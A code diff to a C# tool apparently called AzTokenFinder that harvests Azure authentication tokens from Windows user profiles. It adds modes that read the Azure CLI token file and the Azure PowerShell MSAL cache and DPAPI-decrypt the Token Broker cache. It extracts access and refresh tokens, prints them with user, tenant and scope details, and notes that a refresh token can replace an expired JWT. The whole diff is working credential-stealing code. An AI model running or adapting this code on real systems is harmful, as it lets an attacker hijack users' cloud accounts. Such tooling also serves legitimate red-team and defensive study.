@@ -1,4 +1,5 @@
 ﻿using CommandLine;
+using Newtonsoft.Json;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -230,6 +231,7 @@ namespace AzTokenFinder
         {
             List<string> AccessTokensResult = new List<string>();
             List<string> RefreshTokensResult = new List<string>();
+            List<Tuple<string,string>> AccessRefreshTokenPairResult = new List<Tuple<string, string>>();
             if (opts.Mode.ToLower() != "online" & opts.Mode.ToLower() != "offline")
             {
                 Console.WriteLine("[-] Use --mode online or --mode offline");
@@ -410,10 +412,11 @@ namespace AzTokenFinder
                     string content = File.ReadAllText(opts.Filename, Encoding.Unicode);
                     // Remove last null byte
                     content = content.Remove(content.Length - 1);
-                    try { 
-                        TBStorageObject obj = JsonSerializer.Deserialize<TBStorageObject>(content);
+                    try
+                    {
+                        TBStorageObject obj = System.Text.Json.JsonSerializer.Deserialize<TBStorageObject>(content);
                         string dpapiData = obj.TBDataStoreObject.ObjectData.SystemDefinedProperties.ResponseBytes.Value;
-                        byte[] decryptedData = DPAPIDecrypt(dpapiData);
+                        byte[] decryptedData = DPAPIDecryptBase64(dpapiData);
                         List<String> longerStrings = FindStringInByte(decryptedData);
 
                         foreach (String DATA in longerStrings)
@@ -437,7 +440,7 @@ namespace AzTokenFinder
                         return;
                     }
                 }
-                else
+                else if (opts.targetapp.ToLower() == "office")
                 {
                     String LocalAppDataPAth = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                     string[] filesInCache = Directory.GetFiles(LocalAppDataPAth + @"\\Microsoft\\TokenBroker\\Cache");
@@ -448,9 +451,9 @@ namespace AzTokenFinder
                         content = content.Remove(content.Length - 1);
                         try
                         {
-                            TBStorageObject obj = JsonSerializer.Deserialize<TBStorageObject>(content);
+                            TBStorageObject obj = System.Text.Json.JsonSerializer.Deserialize<TBStorageObject>(content);
                             string dpapiData = obj.TBDataStoreObject.ObjectData.SystemDefinedProperties.ResponseBytes.Value;
-                            byte[] decryptedData = DPAPIDecrypt(dpapiData);
+                            byte[] decryptedData = DPAPIDecryptBase64(dpapiData);
                             List<String> longerStrings = FindStringInByte(decryptedData);
 
                             foreach (String DATA in longerStrings)
@@ -471,6 +474,76 @@ namespace AzTokenFinder
                         catch
                         {
                             continue;
+                        }
+                    }
+
+                }
+                else if (opts.targetapp.ToLower() == "azcli")
+                {
+                    String UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+                    string content = File.ReadAllText(UserProfile + @"\\.Azure\\accessTokens.json", Encoding.Default);
+                    dynamic datas = JsonConvert.DeserializeObject(content);
+                    foreach(var data in datas)
+                    {
+                        if(data.accessToken != null & data.refreshToken != null)
+                        {
+                            AccessRefreshTokenPairResult.Add(new Tuple<string, string>(data.accessToken.ToString(), data.refreshToken.ToString()));
+                        }
+                        else
+                        {
+                            if(data.accessToken != null)
+                            {
+                                AccessTokensResult.Add(data.accessToken);
+                            }
+                            if(data.refreshToken != null)
+                            {
+                                RefreshTokensResult.Add(data.refreshToken);
+                            }
+                        }
+                    }
+                }
+                else if (opts.targetapp.ToLower() == "azpwsh")
+                {
+                    String LocalAppDataPAth = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+                    string content = File.ReadAllText(LocalAppDataPAth + @"\\.IdentityService\\msal.cache", Encoding.Default);
+                    // Remove last null byte
+                    //content = content.Remove(content.Length - 1);
+                    byte[] decryptedData = DPAPIDecrypt(content);
+                    String decryptedContent = Encoding.Default.GetString(decryptedData);
+                    dynamic data = JsonConvert.DeserializeObject(decryptedContent);
+                    if(data.AccessToken != null){
+                        var accessToken = data.AccessToken;
+                        foreach (var elem in accessToken)
+                        {
+                            if (elem.Count > 0)
+                            {
+                                foreach (var item in elem)
+                                {
+                                    if (item.secret != null)
+                                    {
+                                        AccessTokensResult.Add(item.secret.ToString());
+                                    }
+                                }
+                            }
+                        }
+                        
+                    }
+
+                    if (data.RefreshToken != null)
+                    {
+                        var refreshToken = data.RefreshToken;
+                        foreach(var elem in refreshToken)
+                        {
+                            if (elem.Count > 0)
+                            {
+                                foreach (var item in elem)
+                                {
+                                    if (item.secret != null)
+                                    {
+                                        RefreshTokensResult.Add(item.secret.ToString());
+                                    }
+                                }
+                            }
                         }
                     }
                 }
@@ -501,94 +574,180 @@ namespace AzTokenFinder
                 foreach (string token in AccessTokensResult)
                 {
                     JwtSecurityToken parsedToken = new JwtSecurityToken(token);
-                    if (parsedToken.Payload.ContainsKey("exp"))
+                    if (parsedToken.Payload != null)
                     {
-                        try
+                        if (parsedToken.Payload.ContainsKey("exp"))
                         {
-                            long exp = (long)parsedToken.Payload["exp"];
-                            DateTimeOffset TokenExpireTime = DateTimeOffset.FromUnixTimeSeconds(exp);
+                            try
+                            {
+                                long exp = (long)parsedToken.Payload["exp"];
+                                DateTimeOffset TokenExpireTime = DateTimeOffset.FromUnixTimeSeconds(exp);
+                                if (!opts.ShowExpiredTokens)
+                                {
+                                    if (DateTimeOffset.UtcNow > TokenExpireTime)
+                                    {
+                                        continue;
+                                    }
+                                }
+
+                            }
+                            catch { }
+                        }
+                        else
+                        {
                             if (!opts.ShowExpiredTokens)
                             {
-                                if (DateTimeOffset.UtcNow > TokenExpireTime)
-                                {
-                                    continue;
-                                }
+                                continue;
                             }
-
                         }
-                        catch { }
-                    }
-                    else
-                    {
-                        if (!opts.ShowExpiredTokens)
+                        if (parsedToken.Payload.ContainsKey("upn"))
                         {
-                            continue;
+                            Console.WriteLine("UPN: {0}", parsedToken.Payload["upn"]);
                         }
-                    }
-                    if (parsedToken.Payload.ContainsKey("upn"))
-                    {
-                        Console.WriteLine("UPN: {0}", parsedToken.Payload["upn"]);
-                    }
-                    if (parsedToken.Payload.ContainsKey("name"))
-                    {
-                        Console.WriteLine("Name: {0}", parsedToken.Payload["name"]);
-                    }
-                    if (parsedToken.Payload.ContainsKey("preferred_username"))
-                    {
-                        Console.WriteLine("Preferred Username: {0}", parsedToken.Payload["preferred_username"]);
-                    }
-                    if (parsedToken.Payload.ContainsKey("tid"))
-                    {
-                        Console.WriteLine("Tenant ID: {0}", parsedToken.Payload["tid"]);
-                    }
-                    if (parsedToken.Audiences.Count() > 0)
-                    {
-                        Console.WriteLine("Audience: {0}", parsedToken.Audiences.First());
-                    }
-                    if (parsedToken.Payload.ContainsKey("scp"))
-                    {
-                        Console.WriteLine("Scope: {0}", parsedToken.Payload["scp"]);
-                    }
-                    if (parsedToken.Payload.ContainsKey("appid"))
-                    {
-                        Console.WriteLine("AppID: {0}", parsedToken.Payload["appid"]);
-                    }
-                    if (parsedToken.Payload.ContainsKey("exp"))
-                    {
-                        try
+                        if (parsedToken.Payload.ContainsKey("name"))
                         {
-                            long exp = (long)parsedToken.Payload["exp"];
-                            DateTimeOffset TokenExpireTime = DateTimeOffset.FromUnixTimeSeconds(exp);
-                            Console.WriteLine("Expires on: {0}", TokenExpireTime.LocalDateTime);
+                            Console.WriteLine("Name: {0}", parsedToken.Payload["name"]);
                         }
-                        catch { }
-                    }
+                        if (parsedToken.Payload.ContainsKey("preferred_username"))
+                        {
+                            Console.WriteLine("Preferred Username: {0}", parsedToken.Payload["preferred_username"]);
+                        }
+                        if (parsedToken.Payload.ContainsKey("tid"))
+                        {
+                            Console.WriteLine("Tenant ID: {0}", parsedToken.Payload["tid"]);
+                        }
+                        if (parsedToken.Audiences.Count() > 0)
+                        {
+                            Console.WriteLine("Audience: {0}", parsedToken.Audiences.First());
+                        }
+                        if (parsedToken.Payload.ContainsKey("scp"))
+                        {
+                            Console.WriteLine("Scope: {0}", parsedToken.Payload["scp"]);
+                        }
+                        if (parsedToken.Payload.ContainsKey("appid"))
+                        {
+                            Console.WriteLine("AppID: {0}", parsedToken.Payload["appid"]);
+                        }
+                        if (parsedToken.Payload.ContainsKey("exp"))
+                        {
+                            try
+                            {
+                                long exp = (long)parsedToken.Payload["exp"];
+                                DateTimeOffset TokenExpireTime = DateTimeOffset.FromUnixTimeSeconds(exp);
+                                Console.WriteLine("Expires on: {0}", TokenExpireTime.LocalDateTime);
+                            }
+                            catch { }
+                        }
 
+                        Console.WriteLine();
+                        Console.WriteLine(token);
+                        Console.WriteLine("==========================================================");
+                    }
+                }
+            }
+
+            
+            if (RefreshTokensResult.Count() == 0)
+            {
+                Console.WriteLine("[-] Nothing found looking like a RefreshToken... sorry");
+            }
+            else
+            {
+                Console.WriteLine();
+                Console.WriteLine("[+] Found {0} Refresh Token.", RefreshTokensResult.Count().ToString());
+
+                Console.WriteLine();
+                Console.WriteLine("==========================================================");
+                Console.WriteLine();
+
+                foreach (String refreshToken in RefreshTokensResult)
+                {
+                    Console.WriteLine(refreshToken);
                     Console.WriteLine();
-                    Console.WriteLine(token);
                     Console.WriteLine("==========================================================");
                 }
             }
 
-            if (opts.Mode.ToLower() == "onlein")
+            if(AccessRefreshTokenPairResult.Count() > 0)
             {
-                if (RefreshTokensResult.Count() == 0)
+                foreach (Tuple<string,string> entry in AccessRefreshTokenPairResult)
                 {
-                    Console.WriteLine("[-] Nothing found looking like a RefreshToken... sorry");
-                }
-                else
-                {
-                    Console.WriteLine();
-                    Console.WriteLine("[+] Found {0} Refresh Token.", RefreshTokensResult.Count().ToString());
-
-
-                    Console.WriteLine();
-                    Console.WriteLine("==========================================================");
-                    Console.WriteLine();
-
-                    foreach (String refreshToken in RefreshTokensResult)
+                    JwtSecurityToken parsedToken = new JwtSecurityToken(entry.Item1);
+                    bool isExpired = false;
+                    if (parsedToken.Payload != null)
                     {
-                        Console.WriteLine(refreshToken);
+                        if (parsedToken.Payload.ContainsKey("exp"))
+                        {
+                            try
+                            {
+                                long exp = (long)parsedToken.Payload["exp"];
+                                DateTimeOffset TokenExpireTime = DateTimeOffset.FromUnixTimeSeconds(exp);
+                                if (!opts.ShowExpiredTokens)
+                                {
+                                    if (DateTimeOffset.UtcNow > TokenExpireTime)
+                                    {
+                                        isExpired = true;
+                                    }
+                                }
+
+                            }
+                            catch { }
+                        }
+                        else
+                        {
+                            if (!opts.ShowExpiredTokens)
+                            {
+                                continue;
+                            }
+                        }
+                        if (parsedToken.Payload.ContainsKey("upn"))
+                        {
+                            Console.WriteLine("UPN: {0}", parsedToken.Payload["upn"]);
+                        }
+                        if (parsedToken.Payload.ContainsKey("name"))
+                        {
+                            Console.WriteLine("Name: {0}", parsedToken.Payload["name"]);
+                        }
+                        if (parsedToken.Payload.ContainsKey("preferred_username"))
+                        {
+                            Console.WriteLine("Preferred Username: {0}", parsedToken.Payload["preferred_username"]);
+                        }
+                        if (parsedToken.Payload.ContainsKey("tid"))
+                        {
+                            Console.WriteLine("Tenant ID: {0}", parsedToken.Payload["tid"]);
+                        }
+                        if (parsedToken.Audiences.Count() > 0)
+                        {
+                            Console.WriteLine("Audience: {0}", parsedToken.Audiences.First());
+                        }
+                        if (parsedToken.Payload.ContainsKey("scp"))
+                        {
+                            Console.WriteLine("Scope: {0}", parsedToken.Payload["scp"]);
+                        }
+                        if (parsedToken.Payload.ContainsKey("appid"))
+                        {
+                            Console.WriteLine("AppID: {0}", parsedToken.Payload["appid"]);
+                        }
+                        if (parsedToken.Payload.ContainsKey("exp"))
+                        {
+                            try
+                            {
+                                long exp = (long)parsedToken.Payload["exp"];
+                                DateTimeOffset TokenExpireTime = DateTimeOffset.FromUnixTimeSeconds(exp);
+                                Console.WriteLine("Expires on: {0}", TokenExpireTime.LocalDateTime);
+                            }
+                            catch { }
+                        }
+
+                        Console.WriteLine();
+                        Console.WriteLine(entry.Item1);
+                        Console.WriteLine();
+                        if (isExpired)
+                        {
+                            Console.WriteLine("JWT is expired, get a new one with the RefreshToken.");
+                            Console.WriteLine();
+                        }
+                        Console.WriteLine(entry.Item2);
                         Console.WriteLine();
                         Console.WriteLine("==========================================================");
                     }
@@ -597,11 +756,22 @@ namespace AzTokenFinder
         }
 
         // Reference: https://codingvision.net/c-safe-encryption-decryption-using-dpapi
-        public static byte[] DPAPIDecrypt(string text)
+        public static byte[] DPAPIDecryptBase64(string text)
         {
             // the encrypted text, converted to byte array 
             byte[] encryptedText = Convert.FromBase64String(text);
 
+            // calling Unprotect() that returns the original text 
+            byte[] originalText = ProtectedData.Unprotect(encryptedText, null, DataProtectionScope.CurrentUser);
+
+            // finally, returning the result 
+            //return Encoding.Default.GetString(originalText);
+            return originalText;
+        }
+
+        public static byte[] DPAPIDecrypt(string text)
+        {
+            byte[] encryptedText = Encoding.Default.GetBytes(text);
             // calling Unprotect() that returns the original text 
             byte[] originalText = ProtectedData.Unprotect(encryptedText, null, DataProtectionScope.CurrentUser);
 
